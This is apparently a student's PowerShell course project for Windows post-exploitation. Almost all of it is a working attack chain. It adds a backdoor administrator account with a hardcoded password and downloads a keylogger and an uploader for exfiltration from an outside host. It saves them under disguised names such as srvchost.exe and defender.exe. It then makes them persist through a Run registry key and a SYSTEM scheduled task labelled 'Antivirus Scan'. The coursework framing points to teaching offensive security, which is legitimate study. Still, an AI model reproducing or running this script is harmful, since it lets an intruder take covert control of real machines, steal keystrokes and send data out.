#Brandon Cocanig
#CPSC 42700 Project 4: PowerShell Script for Complete Windows Pwnage
#Due: 11:59pm, Tuesday March 26
#----------------------------
# Create a Backdoor Account

net user poweruser PenTester3# /add #create poweruser
net localgroup Admins /add #create g-Admins
net localgroup Administrators Admins /add ## add g-Admins to g-Administrators
net localgroup Admins poweruser /add # add poweruser to g-Admins


#check if C:\Temp is made if not make it
$dirname = "C:\Temp"
if (-not (Test-Path $dirname)) {
    New-Item $dirname -Type directory
}
else {
    Write-Output "dir exists"
}

#Download a Keylogger and an Exfiltration program
$fileurl_1 = "http://front.cs.lewisu.edu/~perryjn/klog.exe"
$fileurl_2 = "http://front.cs.lewisu.edu/~perryjn/uploader.exe"
$dest1 = "C:\Temp\srvchost.exe"
$dest2 = "C:\Temp\defender.exe"

$wclient = New-Object System.Net.WebClient
$wclient.DownloadFile($fileurl_1, $dest1)
$wclient = New-Object System.Net.WebClient
$wclient.DownloadFile($fileurl_2, $dest2)

#START THE downoaded .exe
#Start-Process $dest1
#Start-Process $dest2

#Set the Keylogger to run at every user's startup
$regpath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$appath = "C:\Temp\defender.exe"
$name = "defender"

Set-ItemProperty -Path $regpath -Name $name -Value $appath
# now print it out
Get-ItemProperty $regpath
 
 
# Creating a scheduled job
schtasks.exe /create /s localhost /ru System /tn "Antivirus Scan" /tr "C:\Temp\defender.exe" /sc DAILY /st 02:00